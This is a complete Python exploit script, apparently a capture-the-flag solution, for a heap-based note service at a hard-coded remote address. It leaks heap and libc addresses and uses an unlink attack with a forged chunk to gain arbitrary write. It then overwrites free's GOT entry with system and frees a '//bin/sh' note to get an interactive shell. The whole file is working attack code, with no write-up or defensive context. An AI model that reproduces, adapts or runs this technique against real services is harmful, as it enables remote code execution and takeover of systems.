import socket
import struct
import time
import telnetlib

def p(x):
    return struct.pack('<Q', x)

def up(x):
    return struct.unpack('<Q', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

def read_menu(f):
	readuntil(f, 'choice: ')

def new_book(f, l, content):
	f.write('2\n')
	readuntil(f, 'new note: ')
	f.write(str(l) + '\n')
	readuntil(f, 'your note: ')
	f.write(content)

def del_book(f, idx):
	f.write('4\n')
	readuntil(f, 'number: ')
	f.write(str(idx) + '\n')

def edit_book(f, idx, l, content):
	f.write('3\n')
	readuntil(f, 'number: ')
	f.write(str(idx) + '\n')
	readuntil(f, 'note: ')
	f.write(str(l) + '\n')
	readuntil(f, 'your note: ')
	f.write(content)

def list_book(f, idx):
	f.write('1\n')
	readuntil(f, str(idx) + '. ')
	content = readuntil(f, '\n')
	return content


host = '202.112.26.108'
port = 10001

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

global_struct = 0x602098

read_menu(f)
new_book(f, 256, 'A' * 256) #0

read_menu(f)
new_book(f, 256, 'B' * 256) #1

read_menu(f)
new_book(f, 256, 'C' * 256) #2

read_menu(f)
new_book(f, 256, 'D' * 256) #3

read_menu(f)
new_book(f, 256, 'E' * 256) #4

read_menu(f)
new_book(f, 128, 'F' * 128) #5

read_menu(f)
new_book(f, 256, 'G' * 256) #6

read_menu(f)
del_book(f, 1)

read_menu(f)
del_book(f, 2)

read_menu(f)
edit_book(f, 5, 300, 'X' * 300)

read_menu(f)
del_book(f, 1)

read_menu(f)
leak = list_book(f, 5).ljust(8, '\x00')
leak = up(leak)
global_struct = leak - 7520
print 'global_struct: %s' % hex(global_struct)

read_menu(f)
new_book(f, 120, '1' * 120) #1

read_menu(f)
new_book(f, 120, '2' * 120) #2

read_menu(f)
new_book(f, 120, '3' * 120) #7

read_menu(f)
new_book(f, 120, '4' * 120) #8

vuln_ptr = global_struct + 0xc8

payload = 'A' * 0x80
payload += 'A' * 16
payload += p(0) # prev_size
payload += p(0x80 + 1) # size
payload += p(vuln_ptr - 0x18) # fd
payload += p(vuln_ptr - 0x10) # bk
payload += p(0) # fd_nextsize
payload += p(0) # bk_nextsize
payload += 'A' * (0x70 - 32) # content

payload += p(0x80) # prev_size
payload += p(0x90) # size

payload = payload.ljust(300, 'A')
assert(len(payload) == 300)

read_menu(f)
edit_book(f, 5, 300, payload)

read_menu(f)
del_book(f, 8)

# buffer 7 -> vuln 6
read_menu(f)
payload = p(global_struct + 0x10)
payload = payload.ljust(0x78, 'A')
assert(len(payload) == 0x78)
edit_book(f, 7, 0x78, payload)

# buffer 6 -> global struct
read_menu(f)
payload = p(0x1)
payload += p(0x8)
payload += p(0x6020c0)
payload += p(0x1)
payload += p(0x8)
payload += p(global_struct + 0x20)
payload = payload.ljust(0x100, 'A')
edit_book(f, 6, 0x100, payload)

read_menu(f)
free_got = 0x602018
payload = p(free_got)
edit_book(f, 1, 0x8, payload)

read_menu(f)
leak = list_book(f, 0).ljust(8, '\x00')
free_addr = up(leak)
system_addr = free_addr - 0x82df0 + 0x46640
print 'free: %s' % hex(free_addr)

read_menu(f)
payload = p(system_addr)
edit_book(f, 0, 0x8, payload)

read_menu(f)
payload = p(0x6020c0)
edit_book(f, 1, 0x8, payload)

read_menu(f)
payload = '//bin/sh'
edit_book(f, 0, 0x8, payload)

read_menu(f)
del_book(f, 0)

t = telnetlib.Telnet()
t.sock = s
t.interact()
